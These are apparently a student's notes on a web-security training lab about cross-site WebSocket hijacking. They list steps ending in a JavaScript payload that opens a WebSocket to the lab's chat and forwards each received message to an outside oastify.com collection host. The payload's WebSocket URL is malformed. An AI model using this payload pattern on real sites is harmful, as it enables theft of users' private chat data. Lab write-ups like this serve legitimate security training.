
1. Access the webchat;
2. Send a message;
3. Verify that any CSRF tokens are enable;

![](/static/img/Pasted_image_20231127173005.png)
4. Go to exploit server and paste the following code;

```javascript

<script> var ws = new WebSocket('wss://https://0ae300c804267ecd80bbfd92007b00c3.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://q5wtjfil76nxb2u7l75ewjuyyp4gs6gv.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>

```